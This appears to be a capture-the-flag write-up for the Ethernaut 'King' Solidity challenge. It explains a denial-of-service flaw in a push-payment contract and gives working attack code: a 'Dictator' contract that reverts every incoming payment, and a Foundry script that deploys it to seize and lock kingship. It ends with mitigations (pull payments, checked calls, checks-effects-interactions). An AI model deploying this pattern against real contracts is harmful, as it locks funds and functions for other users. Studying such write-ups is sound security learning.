# Ethernaut Level 9 King

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

Our goal is to somehow claim the kingship and lock it to ourselves so that no one can reclaim it. It is not difficult to claim kingship. We can just send the contract with a larger amount of prize.  We might want to claim the ownership, since in the `receive()` function, `require(msg.value >= prize || msg.sender == owner)` means that the owner can always reclaim kingship with zero money. However, we cannot really claim ownership of the contract because ownership can only be changed in the `constructor`, and it can and can only be called once during the deployment process.

So how can we *lock* the kingship?

We can create a new malicious contract, claim the kingship by sending a certain amount of money, and then revert all the transactions sent to the contract, so that the target will always stuck at `payable(king).transfer(msg.value)`, and king will never be changed. This is a typical *"king of the hill"* attack.

`Dictator.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Dictator {
    uint256 immutable i_value;
    address immutable i_king;

    constructor(uint256 value, address king) payable{
        i_value = value;
        i_king = king;
    }

    function claimKing() external {
        payable(i_king).call{value: i_value}("");
    }

    receive() external payable {
        revert();
    }
}
```

Upon deployment, the `Dictator` contract will be fund a certain amount of money, which will then be used to claim kingship in `claimKing()`. And it will basically revert any transaction that is sent to it. 

`King.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {King} from "../src/King.sol";
import {Dictator} from "../src/Dictator.sol";

contract KingScript is Script {
    King king = King(payable(0xXXXXXXXXXXX));

    function run() external {
        uint256 prize = king.prize();
        uint256 value = prize + 1 wei;
        console.log("prize:", prize);
        console.log("value:", value);
        console.log("Current king:", king._king());

        vm.startBroadcast();
        Dictator dictator = new Dictator{value: value}(value, address(king));
        dictator.claimKing();
        vm.stopBroadcast();
        console.log("New king:", king._king());
    }
}
```

In the script, `value` is going to be 1 wei greater than the current prize, so that we can assure the money is enough.

We can mitigate the risks by adopting a pull vs push payment style, where we can record how much the old king is owed, and let them *pull* (claim) it later in a different function. We should also use `call()` instead of `transfer()` and require it to be successful.

Also, we need to stick to the CEI (check-effect-interaction) standard, and always put the state changing **in front of **actual interactions.